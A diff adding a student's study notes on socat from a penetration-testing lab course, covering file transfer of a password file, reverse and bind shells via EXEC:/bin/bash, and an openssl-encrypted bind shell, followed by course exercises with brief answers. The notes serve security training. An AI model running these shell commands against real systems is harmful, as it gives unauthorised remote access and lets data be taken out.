@@ -78,3 +78,77 @@ okay if firewall blocks both incoming and outcoming that will be a problem.
 
 ![](../chapter3/nc_shell.png)
 
+# socat
+
+similar to netcat but with additional features.
+
+using socat to transfer files
+`sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt`
+
+`socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create`
+
+
+using socat to transfer shells
+
+```
+socat TCP4:localhost:443 EXEC:/bin/bash
+
+```
+
+```
+socat -d -d TCP4-LISTEN:443 STDOUT
+```
+
+Encrypting traffic through bind shell
+
+To continue with the example of Alice and Bob, we will use the openssl application to create a selfsigned certificate using the following options:
+• req: initiate a new certificate signing request
+• -newkey: generate a new private key
+• rsa:2048: use RSA encryption with a 2,048-bit key length.
+• -nodes: store the private key without passphrase protection
+• -keyout: save the key to a file
+• -x509: output a self-signed certificate instead of a certificate request
+• -days: set validity period in days
+• -out: save the certificate to a file
+Once we generate the key, we will cat the certificate and its private key into a file, which we will
+eventually use to encrypt our bind shell.
+
+```
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 36
+2 -out bind_shell.crt
+```
+
+commands 
+
+```
+sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin
+/bash
+```
+
+```
+socat - OPENSSL:10.11.0.4:443,verify=0
+```
+
+### 4.2.4.1 Exerc1ises
+1. Use socat to transfer powercat.ps1 from your Kali machine to your Windows system. Keep
+the file on your system for use in the next section.
+
+![](socat_file_transfer.png)
+
+2. Use socat to create an encrypted reverse shell from your Windows system to your Kali
+machine.
+
+![](reverse_shell.png)
+
+3. Create an encrypted bind shell on your Windows system. Try to connect to it from Kali
+without encryption. Does it still work?
+
+cant do it currently.
+
+4. Make an unencrypted socat bind shell on your Windows system. Connect to the shell using
+Netcat. Does it work?
+Note: If cmd.exe is not executing, research what other parameters you may need to pass to the
+EXEC option based on the error you receive.
+
+![](unencrypted_with_socat_and_netcat.png)
+
